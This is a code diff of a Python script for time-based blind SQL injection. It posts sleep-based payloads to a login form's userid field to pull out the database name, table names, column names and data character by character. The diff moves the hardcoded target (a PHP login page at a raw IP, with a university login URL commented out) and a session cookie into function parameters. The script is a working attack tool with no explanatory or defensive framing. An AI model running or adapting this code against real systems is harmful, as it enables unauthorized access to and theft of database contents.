@@ -1,18 +1,17 @@
 import time
 import requests
 
-url = 'http://104.197.42.200/member/login_ok.php'
+#url = 'http://104.197.42.200/member/login_ok.php'
 #url = 'https://stud.inje.ac.kr/AuthUser.aspx'
-cookies = {'PHPSESSID':'d42rp6qqm5fhj3dmn3830g74pq'}
+#cookies = {'PHPSESSID':'d42rp6qqm5fhj3dmn3830g74pq'}
 keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
-def find_db_length():
+def find_db_length(url, cookies):
 	db_len = 0
 	while 1:
 		db_len += 1
 		value = "' or 1=1 and length(database())={} and sleep(2)#".format(db_len) 
 		params = {'userid': value, 'userpw': 'test'}
-	#	params = {'__VIEWSTATE' :'%2FwEPDwUJODQzOTQyNTc1D2QWAgIDD2QWBgIBDw9kFgoeB29uZm9jdXMFJnJldHVybiBsb2dpbmJveDEodGhpcywgJ2luJywgJ3Bhc3NJRCcpHgZvbmJsdXIFJ3JldHVybiBsb2dpbmJveDIodGhpcywgJ291dCcsICdwYXNzSUQnKR4Kb25rZXlwcmVzcwUYcmV0dXJuIEtleVByZXNzVXNlcklEKCk7Hgtvbm1vdXNlb3ZlcgW0AXRpcF9pdF9sb2dpbigxLCfstZzstIgg7ZWZ67KI7J20IOy0iOq4sCDsgqzsmqnsnpDslYTsnbTrlJQg7J6F64uI64ukJywn7JiIKSDrjIDtlZksIOuMgO2VmeybkCDrqqjrkZAg7ZWZ7KCB7J20IOyeiOuKlCDqsr3smrAg64yA7ZWZIO2VmeuyiOydtCDstIjquLAg7IKs7Jqp7J6Q7JWE7J2065SUIOyeheuLiOuLpCcpOx4Kb25tb3VzZW91dAUXdGlwX2l0X2xvZ2luKDAsICcnLCAnJylkAgUPD2QWBB8ABSZyZXR1cm4gbG9naW5ib3gxKHRoaXMsICdpbicsICdwYXNzUFcnKR8BBSdyZXR1cm4gbG9naW5ib3gyKHRoaXMsICdvdXQnLCAncGFzc1BXJylkAgcPFgIeA3NyYwU6L0NvbW1vbi9JbWFnZXMvTWFpbkltYWdlcy9zcHJpbmcvTG9naW5fVmlzdWFsaW1nYWVf67SELmpwZ2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCWlidG5Mb2dpbm8Xg5F85T53WBeZ6pNiXp0fqIcl', '__VIEWSTATEGENERATOR' :'CA0B0334', '__EVENTVALIDATION' : '%2FwEWBAK8t8LXDQKcgonWCgKBo5SvBQKJo5q5DaCoDbMAKgJiLkKyCoYDX9bgjZeV', 'ibtnLogin.x' :'16', 'ibtnLogin.y' :'26', 'IjisUserID': value, 'IjisPassword': 'test'}
 		start = time.time()
 		response = requests.post(url,data=params, cookies=cookies)
 	#	print(response.content)
@@ -21,7 +20,7 @@ def find_db_length():
 			break
 	return db_len 
 
-def find_db_name(length):
+def find_db_name(url, cookies, length):
 	result = ''
 	for i in range(length):
 		for key in keyword:
@@ -36,7 +35,7 @@ def find_db_name(length):
 				break
 	return result
 
-def find_table_name(db_name):
+def find_table_name(url, cookies, db_name):
 	result = ''
 	list = []
 	size = 0
@@ -62,7 +61,7 @@ def find_table_name(db_name):
 				size += 1
 	return list
 
-def find_column_name(table_name):
+def find_column_name(url, cookies, table_name):
 	result = ''
 	list = []
 	size = 0
@@ -88,7 +87,7 @@ def find_column_name(table_name):
 				size += 1
 	return list
 
-def find_data(table_name, column_name):
+def find_data(url, cookies, table_name, column_name):
 	result = ''
 	list = []
 	size = 0
